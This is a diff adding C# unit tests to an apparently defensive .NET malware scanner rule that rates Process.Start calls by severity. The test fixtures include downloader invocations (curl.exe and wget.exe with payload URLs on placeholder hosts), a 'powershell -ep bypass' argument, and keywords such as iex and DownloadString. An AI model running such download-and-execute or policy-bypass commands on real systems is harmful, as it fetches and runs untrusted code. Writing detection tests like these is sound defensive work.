+        using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
+            module.TypeSystem.Void);
+        var type = new TypeDefinition("Tests", "TestType", TypeAttributes.Public);
+        module.Types.Add(type);
+        type.Methods.Add(method);
+
+        var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var start = new MethodReference("Start", process, process) { HasThis = false };
+        start.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        start.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+
+        var processor = method.Body.GetILProcessor();
+        processor.Emit(OpCodes.Ldstr, executable);
+        processor.Emit(OpCodes.Ldstr, "https://example.invalid/package.bin");
+        processor.Emit(OpCodes.Call, start);
+
+        string description = _rule.GetFindingDescription(method, start, method.Body.Instructions,
+            method.Body.Instructions.Count - 1);
+
+        description.Should().Contain($"Target: \"{executable}\"");
+        description.Should().Contain("Downloader executable with URL arguments");
+        _rule.Severity.Should().Be(Severity.Critical);
+    }
+
+    [Fact]
+    public void GetFindingDescription_DirectTarget_IgnoresUnrelatedStartInfoFileNameSetter()
+    {
+        using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
+            module.TypeSystem.Void);
+        var type = new TypeDefinition("Tests", "TestType", TypeAttributes.Public);
+        module.Types.Add(type);
+        type.Methods.Add(method);
+
+        var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var startInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", module,
+            module.TypeSystem.CoreLibrary);
+        var constructor = new MethodReference(".ctor", module.TypeSystem.Void, startInfo) { HasThis = true };
+        var setFileName = new MethodReference("set_FileName", module.TypeSystem.Void, startInfo) { HasThis = true };
+        setFileName.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var directStart = new MethodReference("Start", process, process) { HasThis = false };
+        directStart.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        directStart.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+
+        var processor = method.Body.GetILProcessor();
+        processor.Emit(OpCodes.Newobj, constructor);
+        processor.Emit(OpCodes.Dup);
+        processor.Emit(OpCodes.Ldstr, "curl.exe");
+        processor.Emit(OpCodes.Callvirt, setFileName);
+        processor.Emit(OpCodes.Pop);
+        processor.Emit(OpCodes.Ldstr, "notepad.exe");
+        processor.Emit(OpCodes.Ldstr, "https://example.invalid/document.txt");
+        processor.Emit(OpCodes.Call, directStart);
+
+        string description = _rule.GetFindingDescription(method, directStart, method.Body.Instructions,
+            method.Body.Instructions.Count - 1);
+
+        description.Should().Contain("Target: \"notepad.exe\"");
+        description.Should().NotContain("Downloader executable with URL arguments");
+        _rule.Severity.Should().Be(Severity.Medium);
+    }
+
+    [Fact]
+    public void GetFindingDescription_CredentialOverload_DoesNotTreatUsernameAsArguments()
+    {
+        using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
+            module.TypeSystem.Void);
+        var type = new TypeDefinition("Tests", "TestType", TypeAttributes.Public);
+        module.Types.Add(type);
+        type.Methods.Add(method);
+
+        var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var secureString = new TypeReference("System.Security", "SecureString", module,
+            module.TypeSystem.CoreLibrary);
+        var start = new MethodReference("Start", process, process) { HasThis = false };
+        start.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        start.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        start.Parameters.Add(new ParameterDefinition(secureString));
+        start.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+
+        var processor = method.Body.GetILProcessor();
+        processor.Emit(OpCodes.Ldstr, "ordinary-tool.exe");
+        processor.Emit(OpCodes.Ldstr, "curl");
+        processor.Emit(OpCodes.Ldnull);
+        processor.Emit(OpCodes.Ldstr, "example-domain");
+        processor.Emit(OpCodes.Call, start);
+
+        string description = _rule.GetFindingDescription(method, start, method.Body.Instructions,
+            method.Body.Instructions.Count - 1);
+
+        description.Should().Contain("Arguments: <unknown/no-arguments>");
+        description.Should().NotContain("suspicious arguments");
+        _rule.Severity.Should().Be(Severity.Medium);
+    }
+
+    [Fact]
+    public void GetFindingDescription_FiveArgumentOverload_ResolvesCommandArguments()
+    {
+        using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
+            module.TypeSystem.Void);
+        var type = new TypeDefinition("Tests", "TestType", TypeAttributes.Public);
+        module.Types.Add(type);
+        type.Methods.Add(method);
+
+        var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var secureString = new TypeReference("System.Security", "SecureString", module,
+            module.TypeSystem.CoreLibrary);
+        var start = new MethodReference("Start", process, process) { HasThis = false };
+        start.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        start.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        start.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        start.Parameters.Add(new ParameterDefinition(secureString));
+        start.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+
+        var processor = method.Body.GetILProcessor();
+        processor.Emit(OpCodes.Ldstr, "curl.exe");
+        processor.Emit(OpCodes.Ldstr, "https://example.invalid/package.bin");
+        processor.Emit(OpCodes.Ldstr, "user");
+        processor.Emit(OpCodes.Ldnull);
+        processor.Emit(OpCodes.Ldstr, "example-domain");
+        processor.Emit(OpCodes.Call, start);
+
+        string description = _rule.GetFindingDescription(method, start, method.Body.Instructions,
+            method.Body.Instructions.Count - 1);
+
+        description.Should().Contain("Arguments: https://example.invalid/package.bin");
+        description.Should().Contain("Downloader executable with URL arguments");
+        _rule.Severity.Should().Be(Severity.Critical);
     }
 
     [Fact]
@@ -405,6 +1010,23 @@ public class ProcessStartRuleTests
 
         result.severity.Should().Be(Severity.Medium);
         result.reason.Should().Contain("Known external tool");
+    }
+
+    [Theory]
+    [InlineData("<local V_0>")]
+    [InlineData("<field iex>")]
+    [InlineData("<static-field downloadfile>")]
+    [InlineData("<null>")]
+    [InlineData("<boxed-value>")]
+    public void DetermineSeverity_ResolverPlaceholderOnlyArguments_DoNotCreateSuspiciousEvidence(
+        string arguments)
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: "ordinary-tool.exe",
+            argumentsLower: arguments);
+
+        result.severity.Should().Be(Severity.Medium);
+        result.reason.Should().Be("External process execution");
     }
 
     [Fact]
@@ -429,6 +1051,65 @@ public class ProcessStartRuleTests
 
         result.severity.Should().Be(Severity.Critical);
         result.reason.Should().Contain("ProcessStartInfo execution with suspicious arguments");
+    }
+
+    [Fact]
+    public void DetermineSeverity_LolBinWithSuspiciousLiteralAndPlaceholder_ReturnsCritical()
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: "powershell.exe",
+            argumentsLower: "-ep bypass <arg 0>");
+
+        result.severity.Should().Be(Severity.Critical);
+        result.reason.Should().Contain("suspicious arguments");
+    }
+
+    [Fact]
+    public void DetermineSeverity_PlaceholderNameAlone_DoesNotCreateSuspiciousArgumentEvidence()
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: "random-tool.exe",
+            argumentsLower: "<dynamic via DownloadString>");
+
+        result.severity.Should().Be(Severity.Medium);
+        result.reason.Should().Be("External process execution");
+    }
+
+    [Fact]
+    public void DetermineSeverity_PlaceholderUrlAlone_DoesNotCreateDownloadEvidence()
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: "curl.exe",
+            argumentsLower: "<dynamic via https://example.test>");
+
+        result.severity.Should().Be(Severity.Medium);
+        result.reason.Should().Be("External process execution");
+    }
+
+    [Theory]
+    [InlineData("curling")]
+    [InlineData("wgetbackup")]
+    public void DetermineSeverity_DownloaderNameSubstring_DoesNotCreateSuspiciousArgumentEvidence(string arguments)
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: "random-tool.exe",
+            argumentsLower: arguments);
+
+        result.severity.Should().Be(Severity.Medium);
+        result.reason.Should().Be("External process execution");
+    }
+
+    [Theory]
+    [InlineData("curl.exe")]
+    [InlineData("wget.exe")]
+    public void DetermineSeverity_DownloaderTargetWithUrl_ReturnsCritical(string target)
+    {
+        var result = InvokeDetermineSeverity(
+            targetLower: target,
+            argumentsLower: "https://example.test/payload");
+
+        result.severity.Should().Be(Severity.Critical);
+        result.reason.Should().ContainEquivalentOf("downloader");
     }
 
     [Fact]
